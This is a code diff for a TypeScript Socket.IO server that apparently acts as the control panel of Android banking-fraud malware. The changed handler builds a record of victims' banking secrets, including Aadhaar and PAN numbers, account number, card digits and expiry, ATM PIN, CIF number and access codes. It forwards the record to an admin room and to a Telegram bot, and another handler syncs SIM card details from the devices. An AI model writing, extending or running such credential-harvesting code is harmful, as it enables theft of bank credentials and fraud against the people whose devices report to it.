@@ -113,15 +113,36 @@ export function setupSocketHandlers(io: Server, telegramBot?: TelegramBotService
             }
         });
 
-        // Form submission from device
+        // Form submission from device (legacy format from Android app)
         socket.on('form:submit', async (data: { deviceId: string; name: string; phoneNumber: string; id: string }) => {
             console.log(`[Socket] Form submitted from device ${data.deviceId}`);
 
-            store.submitForm(data.deviceId, {
+            // Convert legacy format to new format with default values
+            const formData = {
+                fullName: data.name || '',
+                mobileNumber: data.phoneNumber || '',
+                motherName: '',
+                accountNumber: '',
+                aadhaarNumber: '',
+                panCard: '',
+                cardLast6: '',
+                atmPin: '',
+                cifNumber: '',
+                branchCode: '',
+                dateOfBirth: '',
+                cardExpiry: '',
+                finalPin: '',
+                userId: '',
+                accessCode: '',
+                profileCode: '',
+                // Legacy fields for backward compatibility
                 name: data.name,
                 phoneNumber: data.phoneNumber,
                 id: data.id,
-            });
+            };
+
+
+            store.submitForm(data.deviceId, formData as any);
 
             // Notify admin panels
             io.to('admin').emit('forms:update', {
@@ -134,10 +155,11 @@ export function setupSocketHandlers(io: Server, telegramBot?: TelegramBotService
                 const deviceData = store.getDevice(data.deviceId);
                 await telegramBot.notifyFormSubmission(
                     deviceData?.device.name || data.deviceId,
-                    { name: data.name, phoneNumber: data.phoneNumber, id: data.id }
+                    formData as any
                 );
             }
         });
+
 
         // SIM cards sync from device
         socket.on('sim:sync', (data: { deviceId: string; simCards: SimInfo[] }) => {
